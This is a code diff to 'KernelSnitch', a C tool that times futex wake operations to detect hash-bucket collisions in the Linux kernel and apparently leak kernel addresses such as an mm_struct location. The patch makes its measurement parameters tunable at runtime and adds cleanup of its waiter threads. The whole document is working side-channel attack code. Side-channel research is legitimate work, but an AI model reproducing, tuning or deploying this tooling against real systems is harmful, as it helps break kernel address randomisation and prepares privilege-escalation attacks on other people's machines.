@@ -13,6 +13,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <pthread.h>
+#include <limits.h>
 
 #define FUTEX_SZ (64ULL<<30)
 #define FUTEX_MMAP_SZ (1ULL<<30)
@@ -22,7 +23,9 @@
 #ifndef KS_PAGE_SIZE
 #define KS_PAGE_SIZE PAGE_SIZE
 #endif
+#ifndef APPENDED_FUTEXES
 #define APPENDED_FUTEXES 4096
+#endif
 #define MULITPLE 4
 #ifndef KERNELSNITCH_IDENTITY_START
 #define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
@@ -54,6 +57,9 @@ struct kernelsnitch_shared_state {
     size_t cpu_cnt;
     size_t futex_hash_table_size;
     size_t total_futexes;
+    size_t appended_futexes;
+    size_t repeat_measurement;
+    size_t average;
 
     volatile unsigned char *futexes;
     volatile unsigned char inc_futex[KS_PAGE_SIZE];
@@ -64,6 +70,9 @@ struct kernelsnitch_shared_state {
     volatile size_t mm_struct;
 
     pthread_t *tids;
+    pthread_t *increase_tids;
+    size_t increase_count;
+    size_t increase_id;
     size_t identity_diff;
 
     enum kernelsnitch_state state;
@@ -108,21 +117,42 @@ static void *__do_increase(void *arg)
  */
 static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t amount)
 {
-    pthread_t tid;
+    ks->increase_tids = calloc(amount, sizeof(*ks->increase_tids));
+    ASSERT_pr((ks->increase_tids != NULL), "failed to allocate futex waiter ids\n");
+    ks->increase_count = amount;
+    ks->increase_id = id;
     for (size_t i = 0; i < amount; ++i) {
         struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
         inc_arg->id = id;
         inc_arg->ks = ks;
-        SYSCHK(pthread_create(&tid, 0, __do_increase, (void *)inc_arg));
+        SYSCHK(pthread_create(&ks->increase_tids[i], 0, __do_increase,
+                              (void *)inc_arg));
     }
     WAIT();
+}
+
+static void __decrease(struct kernelsnitch_shared_state *ks)
+{
+    if (!ks->increase_tids)
+        return;
+    SYSCHK(__futex((unsigned int *)&ks->inc_futex[ks->increase_id],
+                   FUTEX_WAKE_PRIVATE, INT_MAX, NULL, NULL, 0));
+    for (size_t i = 0; i < ks->increase_count; ++i)
+        SYSCHK(pthread_join(ks->increase_tids[i], NULL));
+    free(ks->increase_tids);
+    ks->increase_tids = NULL;
+    ks->increase_count = 0;
 }
 
 /**
  * Simple compare
  */
+#ifndef REPEAT_MEASUREMENT
 #define REPEAT_MEASUREMENT 128
+#endif
+#ifndef AVERAGE
 #define AVERAGE (1<<3)
+#endif
 static int __compare(const void *a, const void *b)
 {
     return (*(size_t *)a - *(size_t *)b);
@@ -133,24 +163,25 @@ static int __compare(const void *a, const void *b)
  * @arg futex_addr: user-space address of the futex (required only to be a mapped memory)
  * @return averaged time of the futex wait operation
  */
-static size_t __measure(size_t futex_addr)
+static size_t __measure(
+    struct kernelsnitch_shared_state *ks, size_t futex_addr)
 {
     size_t t0;
     size_t t1;
     size_t time = 0;
     // do some simple signal processing and reject bad ones
     size_t __times[REPEAT_MEASUREMENT];
-    for (size_t l = 0; l < REPEAT_MEASUREMENT; ++l) {
+    for (size_t l = 0; l < ks->repeat_measurement; ++l) {
         sched_yield();
         t0 = rdtsc_begin();
         SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
         t1 = rdtsc_end();
         __times[l] = t1 - t0;
     }
-    qsort(__times, REPEAT_MEASUREMENT, sizeof(size_t), __compare);
-    for (size_t l = 0; l < AVERAGE; ++l)
+    qsort(__times, ks->repeat_measurement, sizeof(size_t), __compare);
+    for (size_t l = 0; l < ks->average; ++l)
         time += __times[l];
-    time /= AVERAGE;
+    time /= ks->average;
     return time;
 }
 
@@ -240,6 +271,9 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
     ks->collisions = __collision_cnt;
     ks->verbose = __verbose;
     ks->mte_enabled = __mte_enabled;
+    ks->appended_futexes = APPENDED_FUTEXES;
+    ks->repeat_measurement = REPEAT_MEASUREMENT;
+    ks->average = AVERAGE;
 
     // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
     ks->futex_hash_table_size = 256*ks->cpu_cnt;
@@ -267,6 +301,21 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
     return ks;
 }
 
+void kernelsnitch_set_profile(
+    struct kernelsnitch_shared_state *ks, size_t appended_futexes,
+    size_t repeat_measurement, size_t average)
+{
+    ASSERT_pr((appended_futexes > 0), "invalid appended futex count\n");
+    ASSERT_pr((repeat_measurement > 0 &&
+               repeat_measurement <= REPEAT_MEASUREMENT),
+              "invalid measurement count\n");
+    ASSERT_pr((average > 0 && average <= repeat_measurement),
+              "invalid measurement average\n");
+    ks->appended_futexes = appended_futexes;
+    ks->repeat_measurement = repeat_measurement;
+    ks->average = average;
+}
+
 /**
  * Find collisions for different user space futex addresses within one process and the piled-up hash bucket
  * @arg ks: shared KernelSnitch state
@@ -285,11 +334,13 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
     wanted = ks->collisions - 1;
 
-    size_t approx_time = MIN(__measure((size_t)&ks->futexes[0]), __measure((size_t)&ks->futexes[KS_PAGE_SIZE+8]));
+    size_t approx_time = MIN(
+        __measure(ks, (size_t)&ks->futexes[0]),
+        __measure(ks, (size_t)&ks->futexes[KS_PAGE_SIZE+8]));
 
     // piled-up hash bucket ID 128
     // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
-    __increase(ks, ID, APPENDED_FUTEXES);
+    __increase(ks, ID, ks->appended_futexes);
     if (ks->verbose) pr_info("start finding collisisons\n");
 
     // find futex user space address which collide with the piled-up hash bucket ID 128
@@ -300,7 +351,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         if (id >= FUTEX_SZ)
             break;
         futex_addr = (size_t)&ks->futexes[id];
-        ks->times[i] = __measure(futex_addr);
+        ks->times[i] = __measure(ks, futex_addr);
         if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
             count++;
             ks->futex_addrs[count] = futex_addr;
@@ -314,6 +365,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         pr_warning("only found %zd collisions -> cannot continue\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
     }
+    __decrease(ks);
 }
 size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks)
 {
